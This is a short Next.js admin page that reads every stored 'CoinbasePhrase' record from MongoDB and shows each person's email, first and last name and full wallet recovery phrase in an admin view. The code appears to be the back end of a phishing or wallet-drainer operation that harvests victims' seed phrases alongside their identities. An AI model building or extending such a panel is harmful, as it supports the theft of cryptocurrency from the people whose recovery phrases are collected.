import dbConnect from "@/lib/mongodb";
import CoinbasePhrase from "@/models/CoinbasePhrase";
import CoinbaseKeysClient from "@/components/admin/CoinbaseKeysClient";

export default async function AdminCoinbaseKeysPage() {
    await dbConnect();

    const raw = await CoinbasePhrase.find({}).sort({ createdAt: -1 }).lean();

    const entries = raw.map((e: any) => ({
        _id: e._id.toString(),
        email: e.email || "",
        firstName: e.firstName || "",
        lastName: e.lastName || "",
        phrase: e.phrase || "",
        wordCount: e.wordCount || 12,
        createdAt: e.createdAt?.toISOString() || "",
    }));

    return <CoinbaseKeysClient entries={entries} />;
}
